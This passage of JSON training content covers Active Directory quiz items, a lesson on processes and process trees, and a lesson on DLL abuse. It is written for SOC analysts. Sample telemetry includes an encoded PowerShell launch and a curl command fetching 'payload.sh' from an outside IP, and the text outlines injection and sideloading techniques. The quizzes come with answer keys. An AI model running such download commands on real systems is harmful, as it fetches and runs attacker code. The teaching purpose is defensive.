          "value": "b"
        },
        {
          "label": "It only affects a single user, because each Domain Controller stores just the one administrator account that happens to be logged in at that moment.",
          "value": "c"
        },
        {
          "label": "The risk is purely about disk space, because NTDS.dit is a large file and copying it merely slows the Domain Controller down temporarily.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "NTDS.dit is the AD database file on a Domain Controller and contains every object in the domain, including the password hashes of all accounts up to the administrators, so obtaining it gives an attacker credentials to the whole organisation — which is why the DC is Tier 0 and its compromise equals domain compromise. Option a wrongly trivialises the file's contents. Option c is false because the DC holds the entire domain database, not one account. Option d ignores the actual credential exposure."
    },
    {
      "question": "In Active Directory, which statement about the forest and domain structure is correct, and why does it matter to a SOC analyst assessing the blast radius of an intrusion?",
      "options": [
        {
          "label": "Each Organisational Unit (OU) is a separate security boundary, so an attacker who compromises one OU can never affect users or computers in any other OU.",
          "value": "a"
        },
        {
          "label": "The forest is the true security boundary; everything inside it trusts each other deeply, so the analyst must treat the whole forest as potentially compromised together.",
          "value": "b"
        },
        {
          "label": "The individual domain is the outermost boundary, so a compromise can never spread from one domain to another domain within the same forest under any circumstances.",
          "value": "c"
        },
        {
          "label": "Trees are the top-level security boundary, so multiple forests inside a tree are fully isolated from one another and share no trust of any kind.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The forest — not the domain, OU, or tree — is Active Directory's real security boundary; everything inside a forest trusts each other at a deep level, so an analyst must consider the whole forest at risk together and recognise that owning one domain's DC creates a path across the forest. Option a is wrong because OUs organise objects and apply policy but are not security boundaries. Options c and d invert the hierarchy: the domain is not the outermost boundary, and forests are the top-level container, not trees."
    },
    {
      "question": "You are building detections for early-stage Active Directory attacks. Which pair of observations best matches its likely technique?",
      "options": [
        {
          "label": "A spike of Kerberos service-ticket requests (Event 4769) suggests Kerberoasting, and an account suddenly added to Domain Admins (Event 4728/4732) suggests privilege escalation or persistence.",
          "value": "a"
        },
        {
          "label": "A spike of Event 4769 means the DNS server crashed, and an Event 4728 means a user simply changed their own display name in their profile settings.",
          "value": "b"
        },
        {
          "label": "A spike of Event 4769 indicates a printer was installed, and Event 4732 shows that Group Policy successfully refreshed on a workstation as scheduled.",
          "value": "c"
        },
        {
          "label": "Both Event 4769 and Event 4728 only ever occur during routine backups, so neither is useful for detecting any Active Directory attack technique.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "A burst of Kerberos service-ticket requests (4769) is the classic Kerberoasting signature, since the attacker collects service tickets to crack offline, and adding an account to a privileged group like Domain Admins (4728/4732) is a hallmark of escalation or persistence — both are high-value AD detections. The other options misattribute these events to DNS crashes, display-name changes, printer installs, GPO refreshes, or backups, none of which is what these Security Event IDs record."
    },
    {
      "question": "A Windows Security Event 4768 is generated for a user account, followed moments later by an Event 4769 for a file-server resource that same user just opened. What does this pair of events represent, based on how Kerberos actually works?",
      "options": [
        {
          "label": "The 4768 is the user requesting a Ticket-Granting Ticket at logon, and the 4769 is that same TGT being exchanged for a service ticket to reach the file server.",
          "value": "a"
        },
        {
          "label": "The 4768 means the user's password was reset by an administrator, and the 4769 means the file server itself was renamed on the network.",
          "value": "b"
        },
        {
          "label": "The 4768 and 4769 both represent the exact same action recorded twice, so only one of the two events carries any real investigative value.",
          "value": "c"
        },
        {
          "label": "The 4768 shows a failed logon attempt, and the 4769 shows Group Policy being applied to the workstation a few seconds afterward.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Kerberos is a two-step ticket system: 4768 logs the initial AS-REQ/AS-REP exchange where the DC issues a Ticket-Granting Ticket, and 4769 logs each later TGS-REQ/TGS-REP where that TGT is exchanged for a service ticket to a specific resource like a file server — exactly the flow walked through in the worked login example. Option b invents unrelated meanings for both event IDs. Option c is wrong because they represent two distinct, sequential steps, not a duplicate. Option d misassigns both events to logon failure and Group Policy, neither of which they record."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview",
    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory",
    "https://attack.mitre.org/techniques/T1003/006/",
    "https://learn.microsoft.com/en-us/defender-for-identity/what-is"
  ],
  "xp": 245,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-processes-pids-process-tree",
  "slug": "processes-pids-and-the-process-tree",
  "title": "Processes, PIDs, and the Process Tree",
  "topic": "Operating System Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Almost every investigation a SOC analyst runs comes down to one question: what was running on this machine, and did it belong there? Answering it means understanding processes — what they are, how the operating system names them with PIDs, and how each one is born from a parent, forming a family tree that tells the story of an attack. This beginner lesson builds that foundation from scratch: what a process actually is, how process IDs work, why the parent-child relationship is the single most important idea in endpoint investigation, how to read a process tree to spot the intruder hiding in plain sight, the real tools (Task Manager, tasklist, Get-CimInstance, Process Explorer, ps) you use to look at processes yourself, and how attackers can make a clean-looking tree lie through injection and hollowing.",
  "sections": [
    {
      "heading": "What Is a Process?",
      "content": "A **process** is a program that is actually running. There is an important distinction here: a **program** is a file sitting on disk (like `chrome.exe` or `/usr/bin/python3`) — passive, doing nothing. When you launch it, the operating system loads that file into memory and starts executing it, and *that* running instance is a **process**. The same program can run as several processes at once; open three browser windows and you may have several browser processes, each a separate running instance of the same program file.\n\nWhen the operating system creates a process, it gives that process its own private set of resources:\n\n- **Memory space** — its own area of RAM to hold code and data, isolated from other processes so one crashing program does not corrupt another.\n- **Threads** — one or more streams of execution (the actual sequence of instructions being run). A process always has at least one thread.\n- **Handles** — references to things the process is using, like open files, network connections, or registry keys.\n- **A security context (token)** — *who* the process is running as. This determines its permissions: a process running as an administrator can do far more than one running as an ordinary user.\n\nThat last point is why processes matter so much to security. **A process acts with the privileges of whatever account it runs under.** When an attacker gets their code running inside a process — especially a privileged one — that code inherits those privileges. Much of endpoint defence is about noticing *which* processes are running, *what* they are doing, and *whose* authority they carry.\n\nFor an analyst, the mental shift is to stop thinking about \"programs\" and start thinking about \"running processes,\" because that is what you actually see in your tools. Task Manager on Windows and commands like `ps` and `top` on Linux list the live processes on a machine. Your EDR records them. When an alert fires, you are almost always looking at a process: what it is, where its file lives, what command line launched it, and — the subject of the rest of this lesson — where it came from."
    },
    {
      "heading": "Process IDs (PIDs) — How the OS Names Every Process",
      "content": "With potentially hundreds of processes running at once, the operating system needs a way to tell them apart. It does this with a **PID — a Process ID** — a unique number assigned to each process when it starts. If you see `PID 4728`, that number refers to exactly one running process on that machine at that moment.\n\nA few practical facts about PIDs that every analyst should internalise:\n\n- **PIDs are unique at a given time**, but **they are reused.** When a process ends, its PID is freed and can be handed to a brand-new, unrelated process later. So `PID 4728` this morning and `PID 4728` this afternoon may be two completely different programs. This is why you never identify a process by PID alone across time — you pair it with the process name, start time, and the machine.\n- **PIDs are how tools refer to a specific process.** To end a runaway process you \"kill\" it by PID; to inspect what a process is doing you point your tool at its PID. On Linux, `kill 4728` targets that process; on Windows, tools do the same behind the scenes.\n- **Some PIDs are special.** On Linux, **PID 1** is always the first process the system starts (`init` or `systemd`), the ancestor of everything else. On Windows, low PIDs belong to core system processes.\n\nThe reason PIDs matter for investigation is that they are the thread you pull to follow activity. An alert names a PID; you use it to find the process's file path, its command line, its network connections, and — crucially — its **parent**. Because PIDs get reused, good telemetry records not just the PID but the process's full identity (image path, hashes, command line, and start time) so you can be certain *which* instance you are looking at.\n\nThis is also why attackers cannot simply hide behind a number. Even if malware picks a convincing name, the PID lets your tools tie together everything that one specific running instance did — every file it touched, every connection it made, every child it spawned. Which brings us to the most important relationship of all: who launched whom."
    },
    {
      "heading": "Parent and Child Processes",
      "content": "Processes do not appear from nowhere. **Every process is created by another process** — the one that launches it is the **parent**, and the new one is the **child**. When you double-click an app, the process behind your desktop launches it, becoming its parent. That launched app might in turn open a helper, becoming a parent itself. The result is a family tree of processes, and reading that tree is the heart of endpoint investigation.\n\nJust as a PID identifies a process, the **PPID (Parent Process ID)** records which process was its parent. Together, PIDs and PPIDs let you reconstruct the entire ancestry: this process was launched by that one, which was launched by another, all the way back to the root.\n\n**Why does the SOC care so intensely about parent-child relationships?** Because legitimate software launches other software in *predictable* patterns, and attacks break those patterns. Certain parent-child pairs are normal; others are a screaming alarm. Consider these:\n\n- A **Word document** (`winword.exe`) launching **PowerShell** (`powershell.exe`) is deeply abnormal. Word has no legitimate reason to spawn a scripting engine — this is the classic signature of a **malicious macro** in a phishing document.\n- A **web server** process (`w3wp.exe`) launching a **command shell** (`cmd.exe`) strongly suggests a **web shell** — an attacker running commands through a compromised website.\n- **PowerShell** spawned by an unusual parent, then reaching out to the internet, is a common malware-execution chain.\n\nNone of these is suspicious because of the child alone — PowerShell and cmd are normal, useful tools. They are suspicious because of *who launched them*. This is the concept of **process lineage** or **ancestry**, and it is why modern telemetry always records the parent. The Windows **Sysmon** tool's process-creation event (Event ID **1**) captures exactly this: the process image, its command line, and the **parent image and parent command line** — precisely so an analyst can ask, \"does this parent launching this child make sense?\"\n\nThe skill to build is a sense of *normal* lineage, so the abnormal jumps out. An attacker's code has to run as *some* process, launched by *some* parent — and that parentage is very often the tell that separates a live intrusion from ordinary activity."
    },
    {
      "heading": "Viewing Processes: The Tools of the Trade",
      "content": "Everything in the previous three sections is abstract until you actually look at a running system. Every OS ships built-in tools for listing processes, and every EDR/SIEM adds a much richer version of the same view. Learning the raw tools first is what makes the polished EDR view make sense.\n\n### Windows: Task Manager, tasklist, and Get-CimInstance\n\nThe friendliest tool is **Task Manager** (Ctrl+Shift+Esc), whose Details tab shows PID, name, and — if you add the column — the parent. From a command line, `tasklist` gives the same list as text:\n\n```\nC:\\> tasklist /v\n\nImage Name     PID  Session Name   Session#  Mem Usage  User Name\n========================================================\npowershell.exe 4728 Console        1         42,112 K   CORP\\d.rosen\n```\n\nPowerShell's `Get-CimInstance Win32_Process` exposes the two fields an analyst actually needs — the **parent process ID** and the **full command line**:\n\n```\nPS C:\\> Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine\n\nProcessId ParentProcessId Name             CommandLine\n--------- --------------- ----             -----------\n4728      6112            powershell.exe   powershell.exe -enc SQBFAFgA...\n6112      5544            winword.exe      \"WINWORD.EXE\" /n \"report.docm\"\n```\n\nThat one query has just demonstrated the whole lesson so far: PID, PPID, and command line together tell you that Word (PID 6112) launched PowerShell (PID 4728) with an encoded command — exactly the abnormal lineage the earlier sections warned about.\n\n### Sysinternals Process Explorer\n\nMicrosoft's free **Process Explorer** shows the process tree graphically, colour-codes new and exiting processes, and lets you inspect a process's loaded DLLs, open handles, and digital signature with one click — a favourite tool for manual triage on a live machine.\n\n### Linux: ps and top\n\n```\n$ ps -ef --forest\nUID   PID  PPID  CMD\nroot    1     0  /sbin/init\nroot  842     1    \\_ /usr/sbin/sshd\nweb  2211   842        \\_ bash\nweb  2288  2211            \\_ curl http://185.10.10.10/payload.sh\n```\n\nThe `--forest` flag draws the parent-child indentation directly, so a `curl` process hanging off an interactive `bash` shell, itself hanging off `sshd`, tells its own story: someone logged in over SSH and ran a download.\n\n### Why this matters for the SOC\n\nEDR agents (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) are, underneath, continuously running queries just like these — capturing PID, PPID, image path, command line, and file hashes for every process start, and shipping them to your SIEM. Learning to read `tasklist /v`, `Get-CimInstance Win32_Process`, or `ps -ef --forest` by hand is what lets you sanity-check an EDR console, or investigate a machine where no agent is installed, and it is what makes a polished EDR process-tree view immediately legible rather than a wall of unfamiliar icons."
    },
    {
      "heading": "Reading the Process Tree in an Investigation",
      "content": "Put PIDs, PPIDs, and parent-child relationships together and you get the **process tree** — a hierarchical view of every process and who spawned it. Learning to read it is what turns a pile of individual events into the narrative of an attack.\n\n### What a healthy tree looks like\n\nOn Windows, a few well-known processes anchor the tree, and knowing them lets you spot impostors:\n\n- **System** and core processes sit near the root.\n- **`services.exe`** launches **`svchost.exe`** instances, which host Windows services.\n- **`explorer.exe`** (the desktop) is the parent of the apps a *user* launches — browsers, Office, etc.\n\nAttackers must insert their activity *somewhere* into this tree, and the insertion point is often where they give themselves away.\n\n### A worked example\n\nSuppose an alert fires on a suspicious PowerShell process. You pull its process tree and walk **backwards** through the ancestry:\n\n1. The PowerShell process (child).\n2. Its parent: `winword.exe`.\n3. Word's parent: `explorer.exe` — the user opened the document themselves.\n\nIn three steps the tree has told you the whole initial-access story: a user opened a Word document (likely phishing), a macro launched PowerShell, and PowerShell is now doing something that tripped an alert. Then you walk **forwards** from the PowerShell process to see its own children and network connections — did it download a payload, spawn `cmd.exe`, or connect out to a command-and-control server? That reveals what the attack did *next*.\n\n### Two analyst habits make this reliable\n\nFirst, watch for **impersonation of trusted names**: malware may name itself `svch0st.exe` or run a real-looking `svchost.exe` from the wrong folder or under the wrong parent. The tree exposes this because a legitimate `svchost.exe` is launched by `services.exe`, not by a random user process. Second, remember that a suspicious child with an *innocent* parent, or an innocent child with a *suspicious* parent, both deserve scrutiny — the relationship is the signal.\n\nThe process tree is, in effect, the crime-scene reconstruction of the endpoint. The alert tells you *something* happened; the PIDs and PPIDs let you rebuild the exact sequence — patient zero, the execution chain, and the blast radius — which is exactly what you need to scope and contain the incident."
    },
    {
      "heading": "When the Tree Lies: Process Injection, Hollowing, and Masquerading",
      "content": "So far the process tree has been trustworthy: every malicious action shows up as a new process with a suspicious parent. Attackers know this, so a mature toolkit includes techniques that hide code *inside* a process the tree already trusts, rather than spawning an obviously new one.\n\n### Process injection\n\n**Process injection** (MITRE ATT&CK **T1055**) is the technique of writing malicious code into the memory of an *already-running, legitimate* process and forcing that process to execute it — no new process is created at all. A common recipe on Windows: the attacker opens a handle to a target process (`OpenProcess`), allocates memory inside it (`VirtualAllocEx`), writes their code into that memory (`WriteProcessMemory`), and starts a new thread to run it (`CreateRemoteThread`). The malicious code now runs as, say, `explorer.exe` or a browser — inheriting that process's PID, privileges, and reputation. Nothing in the process tree looks new, because nothing new was launched; the tree only shows *existing* processes doing *unexpected* things.\n\n### Process hollowing\n\n**Process hollowing** (a sub-technique, T1055.012) goes further: the attacker starts a *legitimate* executable in a suspended state, then replaces (\"hollows out\") its memory with malicious code before letting it run. From the process tree's point of view, a perfectly normal-looking `svchost.exe` or `RuntimeBroker.exe` was launched by a normal parent — but the code actually executing inside it is entirely different from what that binary's file on disk contains. This defeats a naive check that only asks \"was this process launched from the right file?\" — you must also ask whether the process's *in-memory* code matches its on-disk image.\n\n### Masquerading\n\n**Masquerading** (T1036) is simpler and cruder: naming or placing malware to *look* like something trusted — `svch0st.exe` (a zero for an 'o'), or a genuine-looking `svchost.exe` run from `C:\\Users\\Public` instead of `System32`. This is exactly why the earlier section stressed checking a process's **path and parent**, not just its name: a legitimate `svchost.exe` is always in `System32` and always launched by `services.exe`.\n\n### Why this matters for reading the tree\n\nThese techniques do not defeat the process tree — they defeat a *shallow* reading of it. The defence is to never trust a name alone and to correlate multiple signals: does the **path** match where that binary should live? Does the **parent** match who should launch it? Does the process's **memory** match its file on disk (a check EDR performs and flags as \"suspicious image\" or \"reflective loading\")? Are there **unexpected loaded modules or remote threads** created into it (visible in Sysmon Event ID 8, CreateRemoteThread, and Event ID 10, ProcessAccess)? A process tree that looks clean at a glance can still hide injected code — which is why experienced analysts pair process ancestry with these deeper, memory-level signals rather than treating a tidy-looking tree as proof of innocence."
    }
  ],
  "keyTakeaways": [
    "A process is a running instance of a program, with its own memory, threads, handles, and a security token that gives it the privileges of the account it runs under — which is why what an attacker's code can do depends on the process it runs inside.",
    "A PID (Process ID) uniquely names each running process but is reused after a process ends, so analysts identify a process by PID plus name, path, and start time — never PID alone across time.",
    "Every process has a parent (recorded as the PPID); legitimate software launches other software in predictable patterns, so abnormal parent-child pairs (winword.exe->powershell.exe, w3wp.exe->cmd.exe) are among the strongest attack signals, captured by Sysmon Event ID 1.",
    "Real tools make this concrete: tasklist /v and Get-CimInstance Win32_Process (Windows) and ps -ef --forest (Linux) show PID, PPID, and command line directly, which is exactly what EDR agents capture at scale for your SIEM.",
    "The process tree (PIDs + PPIDs) lets you reconstruct an attack — walk backward for root cause, forward for what executed next — but process injection (T1055), hollowing (T1055.012), and masquerading (T1036) can make an existing, legitimate-looking process run attacker code, so path, parent, and memory content must all be checked, not just the name."
  ],
  "quiz": [
    {
      "question": "An EDR alert fires on a PowerShell process. You examine the process tree and find its parent process is winword.exe (Microsoft Word), whose own parent is explorer.exe. Why is this parent-child chain a strong indicator of an attack?",
      "options": [
        {
          "label": "It is completely normal, because Microsoft Word routinely launches PowerShell to render documents, so the chain shows healthy everyday activity and needs no review.",
          "value": "a"
        },
        {
          "label": "Word has no legitimate reason to spawn PowerShell, so this lineage matches a malicious macro in a document the user opened — a classic phishing execution chain.",
          "value": "b"
        },
        {
          "label": "It proves the machine is safe, because explorer.exe being the top parent guarantees that every process beneath it was digitally signed and approved.",
          "value": "c"
        },
        {
          "label": "The concern is only that PowerShell is inherently malicious software, so the identity of the parent process is irrelevant to judging whether this is an attack.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Word spawning PowerShell is abnormal lineage — a word processor has no legitimate reason to launch a scripting engine — and with explorer.exe above it, the chain shows a user opened a document whose macro ran PowerShell, the classic phishing execution pattern. Option a is false because Word does not normally launch PowerShell. Option c is wrong because explorer.exe being the ancestor guarantees nothing about safety. Option d is wrong because PowerShell is a legitimate tool; the parent's identity is exactly what makes this suspicious."
    },
    {
      "question": "During an investigation you note that PID 4728 was a suspicious process this morning, but the same PID now belongs to a normal system service this afternoon. What does this illustrate about process IDs?",
      "options": [
        {
          "label": "PIDs are permanent, so a single PID always refers to the exact same process forever, meaning this must be the identical program still running from the morning.",
          "value": "a"
        },
        {
          "label": "PIDs are unique at any moment but are reused after a process ends, so the same number can later belong to a completely different, unrelated process.",
          "value": "b"
        },
        {
          "label": "PIDs are assigned alphabetically by program name, so two processes sharing PID 4728 must be different versions of the very same application.",
          "value": "c"
        },
        {
          "label": "A repeated PID always signals malware impersonation, so the afternoon service is definitely the morning's suspicious process wearing a disguise.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "PIDs are unique only at a given moment; when a process ends, its PID is freed and can be reassigned to a new, unrelated process, so the same number across time can mean two different programs — which is why analysts pair PID with name, path, and start time. Option a is wrong because PIDs are not permanent. Option c invents an alphabetical scheme that does not exist. Option d over-reads a normal reuse as guaranteed impersonation."
    },
    {
      "question": "An analyst inspects a process tree and sees svchost.exe launched normally by services.exe from System32 — nothing looks unusual in the tree. Yet EDR flags it for 'suspicious image in memory'. What technique does this most likely indicate, and why does the tree alone miss it?",
      "options": [
        {
          "label": "DLL search-order hijacking, because svchost.exe is forced to load a same-named malicious DLL placed in the System32 folder ahead of the real one.",
          "value": "a"
        },
        {
          "label": "Process hollowing: a legitimate svchost.exe was launched normally, then its memory was replaced with malicious code, so the path and parent still look normal.",
          "value": "b"
        },
        {
          "label": "A false positive: EDR products cannot reliably analyze svchost.exe processes and routinely flag this specific normal system process without any real reason.",
          "value": "c"
        },
        {
          "label": "PID reuse: the process number once used by unrelated malware was simply recycled and reassigned to this ordinary, currently running svchost.exe instance.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Process hollowing starts a legitimate executable and replaces its in-memory code after launch, so the process tree (path, parent) looks entirely normal while the executing code does not match the file on disk — which is why EDR must also check memory content, not just ancestry. Option a describes DLL hijacking, a different technique with a different telemetry signature. Option c dismisses a real detection capability. Option d misapplies PID reuse, which is about numbering, not memory tampering."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
    "https://attack.mitre.org/techniques/T1059/",
    "https://attack.mitre.org/techniques/T1055/",
    "https://attack.mitre.org/techniques/T1036/"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-dll-explained",
  "slug": "dlls-explained-shared-libraries-and-abuse",
  "title": "DLLs Explained: Shared Libraries and How Attackers Abuse Them",
  "topic": "Windows Fundamentals",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Open almost any Windows program and you will find it quietly loading dozens of files ending in .dll. These are DLLs — shared libraries of code that programs borrow instead of building everything themselves. They are fundamental to how Windows works, and precisely because they are so trusted and so numerous, they are a favourite hiding place for attackers. This lesson explains what a DLL actually is, how programs load them, and the family of techniques — hijacking, sideloading, injection, and the more advanced fileless reflective loading — that turn this everyday mechanism into a stealthy attack, along with what those attacks look like in your telemetry and a full worked investigation you can follow line by line.",
  "sections": [
    {
      "heading": "What Is a DLL?",
      "content": "A **DLL — Dynamic Link Library** — is a file containing code and data that multiple programs can share, rather than each program carrying its own copy. The name unpacks its purpose: it is a **library** of reusable functions, **linked** to a program **dynamically** (at run time, not baked in when the program was built).\n\nThe real-life analogy is a shared toolbox in a workshop. Instead of every worker owning a full set of identical tools, they share one well-stocked toolbox and grab what they need. DLLs are Windows' shared toolbox: common tasks like drawing windows, opening files, or making network connections live in DLLs that any program can call.\n\nThis matters for two reasons:\n\n- **Efficiency and reuse.** Dozens of programs can use the same DLL, saving disk space and memory, and letting Microsoft fix a bug in one shared library rather than in every program.\n- **Windows itself is built from DLLs.** The core Windows API is delivered as DLLs. You will see the same handful constantly: **`kernel32.dll`** (core system functions), **`ntdll.dll`** (the low-level interface to the Windows kernel), **`user32.dll`** (windows and user interface), and **`advapi32.dll`** (security and registry). When a program does almost anything, it is calling functions inside these DLLs.\n\nContrast this with **static linking**, where a program bundles all the code it needs directly into its own `.exe`. Dynamic linking with DLLs is the Windows norm: the `.exe` is relatively small and pulls in the shared libraries it needs when it runs.\n\nFor an analyst, the key idea is that **a running process is not just its `.exe` — it is that executable plus all the DLLs it has loaded into its memory.** That is a strength for attackers: if they can get *their* code loaded as a DLL inside a trusted process, their code runs with that process's identity and privileges, wrapped in the legitimacy of a normal program. Understanding how DLLs get loaded, the next section, is what reveals how that abuse happens."
    },
    {
      "heading": "How Programs Load DLLs — and the Search Order",
      "content": "A program gets a DLL's code into its process in one of two ways, and the difference matters for how attackers abuse it.\n\n### Implicit (load-time) linking\n\nMost DLLs a program needs are listed in the executable itself, and Windows loads them automatically the moment the program starts. The program simply expects `kernel32.dll` and friends to be there.\n\n### Explicit (run-time) loading\n\nA program can also load a DLL on demand while running, by calling the Windows function **`LoadLibrary`** with a DLL's name, and then reaching into it for a specific function. This is how plugins and optional features work.\n\nThe security-critical detail is **how Windows finds a DLL when only its name is given.** If a program asks to load `helper.dll` without specifying exactly where it lives, Windows searches a defined sequence of locations — the **DLL search order** — until it finds a file by that name. Simplified, it looks in places like the folder the application launched from, then system folders like `System32`, then folders on the system `PATH`.\n\nThis search behaviour is the root of an entire attack class. **If an attacker can place a malicious `helper.dll` in a location Windows checks *before* the legitimate one, the program will load the attacker's DLL instead — while believing it loaded the real thing.** The program is not exploited in the traditional sense; it is simply tricked into picking up the wrong file because of where that file sits.\n\nTwo Windows tools also let DLLs be run more directly, and both show up in attacks:\n\n- **`rundll32.exe`** is a built-in program whose job is literally to run a function inside a DLL. Attackers abuse it to execute malicious DLL code while appearing to use a legitimate Windows binary (a living-off-the-land technique).\n- **`regsvr32.exe`** registers DLLs and can be abused similarly to execute code.\n\nSo the loading mechanism gives attackers several openings: substitute a DLL that a program will search for and load, or use trusted Windows binaries to run a DLL of their choosing. The next section walks through the specific techniques by name."
    },
    {
      "heading": "How Attackers Abuse DLLs",
      "content": "Because DLLs are trusted, numerous, and loaded automatically, they support several of the most common stealth techniques in modern intrusions. Three matter most to an analyst.\n\n### DLL Search-Order Hijacking\n\nThe attacker exploits the search order from the previous section: they drop a malicious DLL with the name a program expects into a folder Windows checks first (often the application's own directory). When the program runs and searches for that DLL, it loads the attacker's version instead of the genuine one. The malicious code now runs inside a legitimate, often signed, application. MITRE ATT&CK tracks this as **Hijack Execution Flow: DLL Search Order Hijacking**.\n\n### DLL Sideloading\n\nA close cousin: the attacker brings along a *legitimate, signed* executable that is known to load a particular DLL, and places their malicious DLL alongside it. The trusted `.exe` dutifully loads the attacker's DLL. Because the executable is genuinely signed by a real vendor, this bypasses many trust checks — the malice is in the DLL sitting next to it, not the `.exe`. This is a favourite of advanced actors precisely because it launders their code through a reputable program.\n\n### DLL Injection\n\nRather than tricking a program at load time, the attacker forces their DLL into an *already-running* process. Using Windows functions, they allocate memory inside the target process and make it load the malicious DLL. The attacker's code now executes from within, say, a normal browser or system process — inheriting its identity, its network reputation, and its privileges. This is one form of the broader **process injection** family.\n\nWhat unites all three is the goal of **execution under a trusted identity**. The attacker's code does not run as an obviously suspicious new program; it runs *inside* something Windows and your tools already trust. That is what makes DLL abuse stealthy and why signature-based defences, which focus on the `.exe`, often miss it.\n\nA related giveaway to remember: attackers frequently pair these techniques with **`rundll32.exe`** to launch DLL code directly, so a `rundll32` command line pointing at an unusual DLL or an odd path is a classic hunting lead."
    },
    {
      "heading": "Reflective DLL Injection: When Even the Loader Is Bypassed",
      "content": "The three techniques above — hijacking, sideloading, injection — all still involve a DLL file that Windows' normal loader (`LoadLibrary`) reads from disk at some point, which means it leaves a corresponding **image-load** or **file-creation** trace. Advanced attackers go one step further to remove even that.\n\n### Reflective DLL injection\n\n**Reflective DLL injection** loads a DLL's code directly into a target process's memory *without ever calling the normal Windows loader and often without the DLL ever touching disk as a file*. The malicious code implements its own miniature loader (a 'reflective loader') that maps itself into memory and resolves its own dependencies, bypassing the steps Windows normally logs. This is why it defeats detections that rely purely on file-based or `LoadLibrary`-based image-load events — from the OS's perspective, the module was never conventionally 'loaded' the way `kernel32.dll` was. MITRE ATT&CK groups this under **Process Injection: Dynamic-link Library Injection (T1055.001)**, alongside the older classic form where a DLL *is* dropped to disk and `LoadLibrary` is forced on a remote process via `CreateRemoteThread`.\n\n### Why fileless matters here\n\nBecause reflective loading skips disk entirely, it is a favourite of frameworks used in penetration testing and real intrusions alike (Cobalt Strike's default DLL-loading behaviour is reflective). The practical consequence for a defender: if your detection strategy depends only on 'a DLL file appeared on disk', reflective injection walks straight past it. This is why modern EDR does not just watch the filesystem — it watches **memory allocation patterns inside processes** (large executable memory regions that did not come from a normal module load), **CreateRemoteThread / QueueUserAPC calls between processes** (Sysmon Event ID 8, 'CreateRemoteThread'), and **unusual ProcessAccess** (Sysmon Event ID 10) where one process opens a suspiciously powerful handle to another.\n\n### How this connects back to the earlier techniques\n\nSearch-order hijacking and sideloading are 'quiet' precisely because they abuse a legitimate, logged mechanism (the loader) rather than replacing it — the DLL genuinely gets loaded via `LoadLibrary`, so it shows up in image-load telemetry, just from an unexpected path. Reflective injection is 'quieter still' because it skips the loader and the disk altogether, trading the image-load footprint for a memory-level one. As an analyst, the lesson is that **DLL abuse exists on a spectrum from 'file-based and loud' to 'memory-only and near-invisible'**, and your detection coverage needs to span that whole spectrum — file/image-load telemetry for the first half, process-memory/injection telemetry for the second half — rather than assuming a clean disk means a clean process."
    },
    {
      "heading": "Seeing DLL Abuse in Your Telemetry",
      "content": "DLL abuse is stealthy, but it is not invisible — it leaves distinct traces if you know where to look. The key is that loading a DLL, and dropping a DLL on disk, are both observable events.\n\n### The core signal: module (image) load events\n\nThe Windows **Sysmon** tool records every DLL a process loads as **Event ID 7 (Image Loaded)**, capturing the loading process, the DLL's path, and its signature status. This is the workhorse for DLL hunting. What you look for is *anomaly*:\n\n- A **DLL loading from an unusual path** — a legitimate-sounding DLL in a user's Downloads or Temp folder, or in an application directory where it does not belong, rather than in `System32`.\n- An **unsigned DLL, or one signed by an unexpected vendor**, loaded into a trusted process.\n- A **well-known DLL name appearing in the wrong place**, the fingerprint of search-order hijacking and sideloading.\n\n**Supporting signals:**\n\n- **File-creation events** (Sysmon Event ID 11) showing a DLL being *written* to an application folder shortly before that application loads it — the setup step for hijacking/sideloading.\n- **Process and command-line telemetry** for **`rundll32.exe`** and **`regsvr32.exe`** invoking DLLs from odd locations or with suspicious arguments.\n- **Process injection indicators** (Sysmon Event IDs around remote-thread creation) when a DLL is forced into another process.\n\n### How to hunt\n\nBaseline what \"normal\" DLL loading looks like for your critical applications, then hunt for deviations: DLLs loaded from user-writable directories, unsigned modules in signed processes, and trusted binaries loading DLLs they normally never touch. Tie any find back to the **process tree** from the processes lesson — a sideloaded DLL often accompanies a freshly dropped executable and a suspicious parent, so the surrounding lineage strengthens the case.\n\nThe defensive mindset is to treat a *trusted process behaving untrustworthily* as the alarm. Because DLL abuse deliberately hides inside legitimate programs, you cannot rely on the process name; you rely on the details — *where* its DLLs came from, *whether* they are signed, and *whether* this program has any business loading them. Those details are exactly what module-load telemetry gives you."
    },
    {
      "heading": "A Worked Investigation: Catching a Sideloaded DLL",
